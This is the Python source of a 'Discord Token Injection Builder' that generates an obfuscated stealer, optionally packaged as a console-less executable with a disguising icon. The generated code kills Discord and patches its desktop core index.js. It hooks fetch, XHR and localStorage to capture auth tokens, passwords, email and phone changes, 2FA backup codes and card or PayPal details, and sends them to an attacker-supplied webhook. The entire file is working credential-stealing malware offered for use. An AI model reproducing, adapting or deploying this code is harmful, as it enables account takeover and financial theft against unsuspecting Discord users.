# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import base64
    import os
    import subprocess
    import sys
    import tkinter as tk
    from tkinter import filedialog
    try:
        from PIL import Image
        PIL_AVAILABLE = True
    except ImportError:
        PIL_AVAILABLE = False
except Exception as e:
    MissingModule(e)

Title("Discord Token Injection Builder")
Connection()

def encode_webhook(webhook_url):
    parts = webhook_url.replace("https://discord.com/api/webhooks/", "").split("/")
    webhook_id = parts[0]
    webhook_token = parts[1]
    
    part1 = base64.b64encode("https://discord.com/api/webhooks/".encode()).decode()
    part2 = base64.b64encode(webhook_id.encode()).decode()
    part3 = base64.b64encode(webhook_token.encode()).decode()
    
    return part1, part2, part3

try:
    webhook = ChoiceWebhook()
    part1, part2, part3 = encode_webhook(webhook)
    
    print()
    filename = input(f"{INPUT} File Name {red}->{reset} ").strip()
    if not filename:
        ErrorInput()
    
    Scroll(f"""
{PREFIX}01{SUFFIX}{white} Python File
{PREFIX}02{SUFFIX}{white} Executable File""")
    
    file_type = input(f"\n{INPUT} File Type {red}->{reset} ").strip().lstrip("0")
    
    if file_type not in ["1", "2"]:
        ErrorChoice()
    
    Scroll(f"""
{PREFIX}01{SUFFIX}{white} With Console
{PREFIX}02{SUFFIX}{white} No Console""")
    
    console_choice = input(f"\n{INPUT} Console Type {red}->{reset} ").strip().lstrip("0")
    
    if console_choice not in ["1", "2"]:
        ErrorChoice()
    
    noconsole = console_choice == "2"
    icon_path = None
    temp_icon = False
    
    if file_type == "1":
        extension = ".pyw" if noconsole else ".py"
    else:
        extension = ".exe"
        
        icon_choice = input(f"\n{INPUT} Add an Icon? {YESORNO} {red}->{reset} ").strip().lower()
        
        if icon_choice in ["y", "yes"]:
            print(f"{INPUT} Select an Icon {red}->", reset)
            root = tk.Tk()
            root.withdraw()
            root.wm_attributes('-topmost', 1)
            icon_path = filedialog.askopenfilename(
                title="Select Icon File",
                filetypes=[("Image files", "*.ico *.png"), ("All files", "*.*")]
            )
            root.destroy()
            
            if icon_path:
                if icon_path.lower().endswith('.png'):
                    if not PIL_AVAILABLE:
                        print(f"{LOADING} Installing Pillow for icon conversion..", reset)
                        try:
                            subprocess.run([sys.executable, "-m", "pip", "install", "pillow"], check=True, capture_output=True)
                            from PIL import Image
                            print(f"{SUCCESS} Pillow installed!", reset)
                        except Exception as pil_error:
                            print(f"{ERROR} Failed to install Pillow:{red} {pil_error}", reset)
                            print(f"{INFO} Icon will not be used.", reset)
                            icon_path = None
                    
                    if icon_path:
                        print(f"{LOADING} Converting PNG to ICO..", reset)
                        try:
                            from PIL import Image
                            img = Image.open(icon_path)
                            ico_path = os.path.join(os.path.dirname(icon_path), os.path.splitext(os.path.basename(icon_path))[0] + ".ico")
                            img.save(ico_path, format='ICO', sizes=[(256, 256)])
                            icon_path = ico_path
                            temp_icon = True
                            print(f"{SUCCESS} Icon converted:{red} {os.path.basename(icon_path)}", reset)
                        except Exception as e:
                            print(f"{ERROR} Failed to convert icon:{red} {e}", reset)
                            icon_path = None
                else:
                    print(f"{SUCCESS} Icon selected:{red} {os.path.basename(icon_path)}", reset)
            else:
                print(f"{INFO} No icon selected.", reset)
    
    print(f"\n{LOADING} Generating Token Injection File..", reset)
    
    Code = f'''import os as _0x1a2b3c
import sys as _0x4d5e6f
import json as _0x7g8h9i
import re as _0x2j3k4l
import base64 as _0x5m6n7o
import shutil as _0x8p9q0r
import requests as _0x3s4t5u
from datetime import datetime as _0x6v7w8x

_0x9y0z1a = "{part1}"
_0x2b3c4d = "{part2}"
_0x5e6f7g = "{part3}"

def _0xDecode():
    _p1 = _0x5m6n7o.b64decode(_0x9y0z1a).decode()
    _p2 = _0x5m6n7o.b64decode(_0x2b3c4d).decode()
    _p3 = _0x5m6n7o.b64decode(_0x5e6f7g).decode()
    return _p1 + _p2 + "/" + _p3

_0xURL = _0xDecode()

_INJECTION_CODE = (
    """const _0xe1=require('electron');_0xe1.app.on('browser-window-created',(_0xe2,_0xe3)=>{{""" +
    """_0xe3.webContents.on('dom-ready',()=>{{_0xe3.webContents.executeJavaScript(`""" +
    """(function(){{const _0xa1='""" + _0xURL + """';let _0xa6={{}};const _0xa7=8847360;""" +
    """function _0xa8(_0xb1){{try{{fetch(_0xa1,{{method:'POST',headers:{{'Content-Type':'application/json'}},""" +
    """body:JSON.stringify(_0xb1)}}).catch(()=>{{}});}}catch(e){{}}}}""" +
    """function _0xa9(_0xc1,_0xc2){{if(_0xa6[_0xc1]){{_0xc2(_0xa6[_0xc1]);return;}}""" +
    """fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':_0xc1,'Content-Type':'application/json'}}}})""" +
    """.then(r=>r.json()).then(d=>{{_0xa6[_0xc1]=d;_0xc2(d);}}).catch(()=>_0xc2(null));}}""" +
    """function _0xaa(_0xd1){{try{{const k='bw_'+_0xd1.substring(0,20);return localStorage.getItem(k)==='1';}}catch(e){{return false;}}}}""" +
    """function _0xab(_0xe1){{try{{const k='bw_'+_0xe1.substring(0,20);localStorage.setItem(k,'1');}}catch(e){{}}}}""" +
    """function _0xac(_0xf1){{""" +
    """const _0xf2={{0:"No Nitro",1:"Nitro Classic",2:"Nitro",3:"Nitro Basic"}};const _0xf3=_0xf2[_0xf1.premium_type]||"Unknown";""" +
    """return`Username : ${{_0xf1.username}}\\\\nUser Id  : ${{_0xf1.id}}\\\\nEmail    : ${{_0xf1.email||'N/A'}}\\\\nPhone    : ${{_0xf1.phone||'None'}}\\\\nNitro    : ${{_0xf3}}`;}}""" +
    """function _0xad(_0xg1,_0xg2){{if(_0xaa(_0xg1))return;_0xa9(_0xg1,(_0xg3)=>{{if(!_0xg3||!_0xg3.id)return;""" +
    """const _0xg4=_0xg3.avatar?`https://cdn.discordapp.com/avatars/${{_0xg3.id}}/${{_0xg3.avatar}}.png`:""" +
    """'https://cdn.discordapp.com/embed/avatars/0.png';const _0xg5={{username:"Buildware BOT",""" +
    """avatar_url:"https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png",""" +
    """embeds:[{{title:"Token Injected!",color:_0xa7,thumbnail:{{url:_0xg4}},fields:[{{name:"👤 User Information",""" +
    """value:`\\\\\\`\\\\\\`\\\\\\`${{_0xac(_0xg3)}}\\\\\\`\\\\\\`\\\\\\``,inline:false}},{{name:"📝 Injection Type",""" +
    """value:`\\\\\\`\\\\\\`\\\\\\`${{_0xg2}}\\\\\\`\\\\\\`\\\\\\``,inline:false}},{{name:"🔐 Token",""" +
    """value:`\\\\\\`\\\\\\`\\\\\\`${{_0xg1}}\\\\\\`\\\\\\`\\\\\\``,inline:false}}],""" +
    """footer:{{text:"Buildware BOT - github.com/v4lkyr0/Buildware-Tool",""" +
    """icon_url:"https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png"}},""" +
    """timestamp:new Date().toISOString()}}]}};_0xa8(_0xg5);_0xab(_0xg1);}});}}function _0xae(_0xh1,_0xh2,_0xh3,_0xh4,_0xh5){{""" +
    """_0xa9(_0xh1,(_0xh6)=>{{if(!_0xh6||!_0xh6.id)return;const _0xh7=_0xh6.avatar?""" +
    """`https://cdn.discordapp.com/avatars/${{_0xh6.id}}/${{_0xh6.avatar}}.png`:""" +
    """'https://cdn.discordapp.com/embed/avatars/0.png';const _0xh8={{'email':'📧','password':'🔒','phone':'📱',""" +
    """'username':'✏️','payment':'💳','2fa_enabled':'🔐','2fa_disabled':'🔓','nitro':'💎','2fa_codes':'🔑','billing':'💰'}};""" +
    """const _0xh9={{'email':'Email Changed!','password':'Password Changed!','phone':'Phone Number Changed!',""" +
    """'username':'Username Changed!','payment':'Payment Method Added!','2fa_enabled':'2FA Enabled!',""" +
    """'2fa_disabled':'2FA Disabled!','nitro':'Nitro Purchased!','2fa_codes':'2FA Backup Codes Accessed!',""" +
    """'billing':'Billing Info Accessed!'}};const _0xha=_0xh8[_0xh2]||'⚠️';const _0xhb=_0xh9[_0xh2]||'Account Change Detected!';""" +
    """const _0xhc=[{{name:"👤 User Information",value:`\\\\\\`\\\\\\`\\\\\\`${{_0xac(_0xh6)}}\\\\\\`\\\\\\`\\\\\\``,inline:false}},""" +
    """{{name:`${{_0xha}} Change Type`,value:`\\\\\\`\\\\\\`\\\\\\`${{_0xh2.toUpperCase()}}\\\\\\`\\\\\\`\\\\\\``,inline:false}}];""" +
    """if(_0xh3){{_0xhc.push({{name:"📋 Old Value",value:`\\\\\\`\\\\\\`\\\\\\`${{_0xh3}}\\\\\\`\\\\\\`\\\\\\``,inline:true}});}}""" +
    """if(_0xh4){{_0xhc.push({{name:"📝 New Value",value:`\\\\\\`\\\\\\`\\\\\\`${{_0xh4}}\\\\\\`\\\\\\`\\\\\\``,inline:true}});}}""" +
    """if(_0xh5){{_0xhc.push({{name:"➕ Additional Info",value:`\\\\\\`\\\\\\`\\\\\\`${{_0xh5}}\\\\\\`\\\\\\`\\\\\\``,inline:false}});}}""" +
    """_0xhc.push({{name:"🔐 Token",value:`\\\\\\`\\\\\\`\\\\\\`${{_0xh1}}\\\\\\`\\\\\\`\\\\\\``,inline:false}});""" +
    """const _0xhd={{username:"Buildware BOT",""" +
    """avatar_url:"https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png",""" +
    """embeds:[{{title:_0xhb,color:_0xa7,thumbnail:{{url:_0xh7}},fields:_0xhc,""" +
    """footer:{{text:"Buildware BOT - github.com/v4lkyr0/Buildware-Tool",""" +
    """icon_url:"https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png"}},""" +
    """timestamp:new Date().toISOString()}}]}};_0xa8(_0xhd);}});}}(function(){{const _0xi1=Array.prototype.push;""" +
    """Array.prototype.push=function(...args){{try{{args.forEach(arg=>{{if(typeof arg==='string'){{""" +
    """const match=arg.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/);if(match)_0xad(match[0],'Login Injection');}}}});}}""" +
    """catch(e){{}}return _0xi1.apply(this,args);}};}})();(function(){{const _0xj1=window.localStorage.__proto__.setItem;""" +
    """window.localStorage.__proto__.setItem=function(key,value){{try{{if(key==='token'||key.includes('token')){{""" +
    """const match=value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/);if(match)_0xad(match[0],'LocalStorage Injection');}}}}""" +
    """catch(e){{}}return _0xj1.apply(this,arguments);}};}})();(function(){{const _0xk1=window.fetch;""" +
    """window.fetch=function(...args){{const[url,options={{}}]=args;try{{if(url&&url.includes('discord.com/api')){{""" +
    """const headers=options.headers||{{}};const auth=headers['Authorization']||headers['authorization'];if(auth){{""" +
    """const match=auth.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/);if(match){{const token=match[0];""" +
    """const method=options.method||'GET';if(url.includes('/users/@me')&&method==='PATCH'&&options.body){{try{{""" +
    """const body=JSON.parse(options.body);if(body.email)_0xae(token,'email','Hidden',body.email);""" +
    """if(body.password&&body.new_password)_0xae(token,'password',body.password,body.new_password);""" +
    """if(body.phone)_0xae(token,'phone','Hidden',body.phone);if(body.username)_0xae(token,'username','Hidden',body.username);}}""" +
    """catch(e){{}}}}else if(url.includes('/billing/payment-sources')&&method==='POST'&&options.body){{try{{""" +
    """const body=JSON.parse(options.body);let info='Payment Method Added';if(body.payment_gateway===1&&body.card){{""" +
    """info=`Credit Card\\\\nLast 4: ****${{body.card.number?.slice(-4)||'????'}}\\\\nExpiry: ${{body.card.exp_month||'??'}}/${{body.card.exp_year||'??'}}`;}}""" +
    """else if(body.payment_gateway===2){{info='PayPal Account';}}_0xae(token,'payment','None',info);}}catch(e){{}}}}""" +
    """else if(url.includes('/mfa/totp/enable')&&method==='POST'){{_0xae(token,'2fa_enabled','Disabled','Enabled');}}""" +
    """else if(url.includes('/mfa/totp/disable')&&method==='POST'){{_0xae(token,'2fa_disabled','Enabled','Disabled');}}""" +
    """else if(url.includes('/store/skus/')&&url.includes('/purchase')&&method==='POST'){{_0xae(token,'nitro','No Nitro','Nitro Purchased');}}""" +
    """else{{_0xad(token,'API Request Injection');}}}}}}}}}}catch(e){{}}return _0xk1.apply(this,args).then(response=>{{try{{""" +
    """if(url&&url.includes('discord.com/api')){{const headers=options.headers||{{}};const auth=headers['Authorization']||headers['authorization'];""" +
    """if(auth){{const match=auth.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/);if(match){{const token=match[0];""" +
    """if(url.includes('/mfa/codes-verification')&&options.method==='POST'){{response.clone().json().then(data=>{{""" +
    """if(data?.backup_codes){{const codes=data.backup_codes.map((c,i)=>`${{i+1}}. ${{c.code}}`).join('\\\\n');""" +
    """_0xae(token,'2fa_codes',null,null,codes);}}}}).catch(()=>{{}});}}else if(url.includes('/billing/payment-sources')&&options.method==='GET'){{""" +
    """response.clone().json().then(data=>{{if(Array.isArray(data)&&data.length>0){{const methods=data.map(p=>{{""" +
    """if(p.type===1)return`💳 ****${{p.last_4}} | ${{p.expires_month}}/${{p.expires_year}} | ${{p.brand}}`;""" +
    """if(p.type===2)return`💰 PayPal: ${{p.email}}`;return'Unknown';}}).join('\\\\n');_0xae(token,'billing',null,null,methods);}}}}).catch(()=>{{}});}}}}}}}}""" +
    """catch(e){{}}return response;}});}};}})();(function(){{const _0xl1=XMLHttpRequest.prototype.open;const _0xl2=XMLHttpRequest.prototype.send;""" +
    """XMLHttpRequest.prototype.open=function(method,url,...rest){{this._bw_url=url;this._bw_method=method;""" +
    """return _0xl1.apply(this,[method,url,...rest]);}};XMLHttpRequest.prototype.send=function(...args){{try{{""" +
    """if(this._bw_url&&this._bw_url.includes('discord.com/api')){{const authHeader=this.getResponseHeader?.('authorization');""" +
    """if(authHeader){{const match=authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/);if(match)_0xad(match[0],'XHR Injection');}}}}}}""" +
    """catch(e){{}}return _0xl2.apply(this,args);}};}})();(function(){{setTimeout(()=>{{try{{""" +
    """const tokenRegex=/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/;for(let i=0;i<window.localStorage.length;i++){{""" +
    """const key=window.localStorage.key(i);if(key&&(key==='token'||key.includes('token'))){{""" +
    """const value=window.localStorage.getItem(key);if(value){{const match=value.match(tokenRegex);""" +
    """if(match&&!_0xaa(match[0])){{_0xad(match[0],'Startup Injection');}}}}}}}}catch(e){{}}}},3000);}})();""" +
    """`);}}); }});"""
)

_PATHS = {{
    'Discord': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'Discord'),
    'Discord PTB': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordPTB'),
    'Discord Canary': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordCanary'),
    'Discord Development': _0x1a2b3c.path.join(_0x1a2b3c.getenv('LOCALAPPDATA', ''), 'DiscordDevelopment'),
    'Lightcord': _0x1a2b3c.path.join(_0x1a2b3c.getenv('APPDATA', ''), 'Lightcord')
}}

_DISCORD_PROCESSES = ['Discord.exe', 'DiscordPTB.exe', 'DiscordCanary.exe', 'DiscordDevelopment.exe', 'Lightcord.exe']

def _0xKill_Discord():
    """
    Kill all Discord processes before injection.
    Returns the number of processes killed.
    """
    import subprocess as _0x9s8t7u
    _0xKilled = 0
    for _0xProc in _DISCORD_PROCESSES:
        try:
            result = _0x9s8t7u.run(['taskkill', '/F', '/IM', _0xProc], 
                                  capture_output=True, 
                                  text=True, 
                                  creationflags=0x08000000)
            if result.returncode == 0:
                _0xKilled += 1
        except:
            pass
    return _0xKilled

def _0xFind_Discord_Modules(_0xPath):
    """
    Recursively find Discord desktop core modules in the installation path.
    Returns a list of paths to inject the code into.
    """
    _0xModules = []
    try:
        for _0xAppDir in _0x1a2b3c.listdir(_0xPath):
            if not _0xAppDir.startswith('app'):
                continue
            
            _0xApp_Path = _0x1a2b3c.path.join(_0xPath, _0xAppDir)
            if not _0x1a2b3c.path.isdir(_0xApp_Path):
                continue
            
            _0xModules_Dir = _0x1a2b3c.path.join(_0xApp_Path, 'modules')
            if not _0x1a2b3c.path.exists(_0xModules_Dir):
                continue
            
            for _0xModule_Name in _0x1a2b3c.listdir(_0xModules_Dir):
                if _0xModule_Name.startswith('discord_desktop_core-'):
                    _0xCore_Path = _0x1a2b3c.path.join(_0xModules_Dir, _0xModule_Name, 'discord_desktop_core')
                    if _0x1a2b3c.path.exists(_0xCore_Path):
                        _0xModules.append(_0xCore_Path)
    except PermissionError:
        pass
    except Exception:
        pass
    
    return _0xModules

def _0xInject_Code(_0xModule_Path):
    """
    Inject the malicious code into Discord's index.js file.
    Creates backup before injection.
    Returns True if successful, False otherwise.
    """
    try:
        _0xIndex_File = _0x1a2b3c.path.join(_0xModule_Path, 'index.js')
        
        if _0x1a2b3c.path.exists(_0xIndex_File):
            _0xBackup_File = _0x1a2b3c.path.join(_0xModule_Path, 'index.js.backup')
            if not _0x1a2b3c.path.exists(_0xBackup_File):
                _0x8p9q0r.copy2(_0xIndex_File, _0xBackup_File)
            
            with open(_0xIndex_File, 'r', encoding='utf-8', errors='ignore') as _0xF:
                _0xContent = _0xF.read()
            
            if '_0xa1' in _0xContent:
                return False
            
            _0xNew_Content = _INJECTION_CODE + '\n\n' + _0xContent
            with open(_0xIndex_File, 'w', encoding='utf-8') as _0xF:
                _0xF.write(_0xNew_Content)
            
            return True
        else:
            _0x1a2b3c.makedirs(_0xModule_Path, exist_ok=True)
            with open(_0xIndex_File, 'w', encoding='utf-8') as _0xF:
                _0xF.write(_INJECTION_CODE)
            _0xPackage_File = _0x1a2b3c.path.join(_0xModule_Path, 'package.json')
            _0xPackage_Data = {{
                "name": "discord_desktop_core",
                "version": "1.0.0",
                "description": "Discord desktop core module",
                "main": "index.js"
            }}
            with open(_0xPackage_File, 'w', encoding='utf-8') as _0xF:
                _0x7g8h9i.dump(_0xPackage_Data, _0xF, indent=2)
            
            return True
            
    except PermissionError:
        return False
    except Exception:
        return False

def _0xMain():
    """
    Main injection routine.
    Scans all Discord installations and injects code into each one.
    Sends a webhook notification upon successful injection.
    """
    import time as _0xt1m3
    
    print("[*] Closing all Discord processes...")
    _0xKilled = _0xKill_Discord()
    if _0xKilled > 0:
        print(f"[+] Closed {{_0xKilled}} Discord process(es)")
        _0xt1m3.sleep(2)
    else:
        print("[!] No Discord processes found running")
    
    print("[*] Starting injection...")
    _0xInjected_Count = 0
    _0xResults = []
    
    for _0xName, _0xPath in _PATHS.items():
        if not _0x1a2b3c.path.exists(_0xPath):
            continue
        
        try:
            _0xModules = _0xFind_Discord_Modules(_0xPath)
            
            if not _0xModules:
                continue
            
            for _0xModule in _0xModules:
                if _0xInject_Code(_0xModule):
                    _0xInjected_Count += 1
                    _0xResults.append((_0xName, _0xModule))
                    print(f"[+] Injected: {{_0xName}}")
                    
        except Exception:
            continue
    
    if _0xInjected_Count > 0:
        print(f"\\n[+] Successfully injected {{_0xInjected_Count}} Discord installation(s)!")
        print("[!] You can now restart Discord. The injection will activate automatically.")
        
        try:
            _0xPayload = {{
                "username": "Buildware BOT",
                "avatar_url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png",
                "embeds": [{{
                    "title": "💉 Injection Successful!",
                    "description": f"Successfully injected {{_0xInjected_Count}} Discord installation(s)",
                    "color": 8847360,
                    "fields": [
                        {{
                            "name": "📋 Injected Clients",
                            "value": "\\n".join([f"• **{{r[0]}}**\\n  `{{r[1]}}`" for r in _0xResults[:10]]),
                            "inline": False
                        }}
                    ],
                    "footer": {{
                        "text": "Buildware BOT - github.com/v4lkyr0/Buildware-Tool",
                        "icon_url": "https://cdn.discordapp.com/avatars/1402299544712253541/64b913d3d165e3c465343c4e296227ba.png"
                    }},
                    "timestamp": _0x6v7w8x.now().astimezone().isoformat()
                }}]
            }}
            _0x3s4t5u.post(_0xURL, json=_0xPayload, timeout=5)
        except:
            pass
    else:
        print("\\n[-] No Discord installations found or injection failed")
        print("[!] Make sure Discord is installed")

if __name__ == "__main__":
    try:
        _0xMain()
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
'''
    
    import shutil
    import time
    
    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Output/DiscordTokenInjection")
    os.makedirs(output_dir, exist_ok=True)
    
    if extension == ".exe":
        temp_py = os.path.join(output_dir, f"{filename}.py")
        with open(temp_py, "w", encoding="utf-8") as f:
            f.write(Code)
        
        try:
            import pefile
        except ImportError:
            print(f"{LOADING} Installing pefile dependency..", reset)
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pefile", "--force-reinstall"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{SUCCESS} pefile installed successfully!", reset)
            else:
                print(f"{ERROR} Failed to install pefile!", reset)
                if result.stderr:
                    print(f"{red}{result.stderr}{reset}")
        
        try:
            import PyInstaller
        except ImportError:
            print(f"{LOADING} Installation PyInstaller..", reset)
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "pefile"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{SUCCESS} PyInstaller installed successfully!", reset)
            else:
                print(f"{ERROR} Failed to install PyInstaller!", reset)
                if result.stderr:
                    print(f"{red}{result.stderr}{reset}")
        
        print(f"{LOADING} Building .exe file..", reset)
        
        try:
            pyinstaller_args = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--clean",
                f"--distpath={output_dir}",
                f"--workpath={os.path.join(output_dir, 'build')}",
                f"--specpath={output_dir}",
            ]
            
            if noconsole:
                pyinstaller_args.append("--noconsole")
            
            if icon_path:
                pyinstaller_args.append(f"--icon={icon_path}")
            
            pyinstaller_args.append(temp_py)
            
            result = subprocess.run(pyinstaller_args, capture_output=True, text=True)
            
            if result.returncode != 0:
                if os.path.exists(temp_py):
                    os.remove(temp_py)
                if temp_icon and icon_path and os.path.exists(icon_path):
                    os.remove(icon_path)
                print(f"{ERROR} PyInstaller build failed!", reset)
                if result.stderr:
                    print(f"{ERROR} Error output:", reset)
                    for line in result.stderr.split('\n')[-10:]:
                        if line.strip():
                            print(f"  {red}{line}{reset}")
                print(f"{INFO} Saving as Python file instead.", reset)
                extension = ".py"
                output_path = os.path.join(output_dir, f"{filename}{extension}")
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(Code)
                print(f"{SUCCESS} File created:{red} {output_path}", reset)
            else:
                if os.path.exists(temp_py):
                    os.remove(temp_py)
                
                spec_file = os.path.join(output_dir, f"{filename}.spec")
                if os.path.exists(spec_file):
                    os.remove(spec_file)
                
                build_dir = os.path.join(output_dir, "build")
                if os.path.exists(build_dir):
                    for i in range(3):
                        try:
                            time.sleep(0.5)
                            shutil.rmtree(build_dir, ignore_errors=True)
                            break
                        except:
                            continue
                
                if temp_icon and icon_path and os.path.exists(icon_path):
                    os.remove(icon_path)
                
                output_path = os.path.join(output_dir, f"{filename}.exe")
                print(f"{SUCCESS} Executable file created:{red} {output_path}", reset)
        except Exception as e:
            if os.path.exists(temp_py):
                os.remove(temp_py)
            if temp_icon and icon_path and os.path.exists(icon_path):
                os.remove(icon_path)
            
            spec_file = os.path.join(output_dir, f"{filename}.spec")
            if os.path.exists(spec_file):
                os.remove(spec_file)
            
            build_dir = os.path.join(output_dir, "build")
            if os.path.exists(build_dir):
                for i in range(5):
                    try:
                        time.sleep(0.5)
                        shutil.rmtree(build_dir, ignore_errors=True)
                        break
                    except:
                        continue
            
            print(f"{ERROR} Unexpected error:{red} {e}", reset)
            print(f"{INFO} Saving as Python file instead.", reset)
            extension = ".py"
            output_path = os.path.join(output_dir, f"{filename}{extension}")
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(Code)
            print(f"{SUCCESS} Python file created:{red} {output_path}", reset)
    else:
        output_path = os.path.join(output_dir, f"{filename}{extension}")
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(Code)
        print(f"{SUCCESS} Python file created:{red} {output_path}", reset)
    
    os.startfile(output_dir)
    Continue()
    Reset()

except Exception as e:
    Error(e)
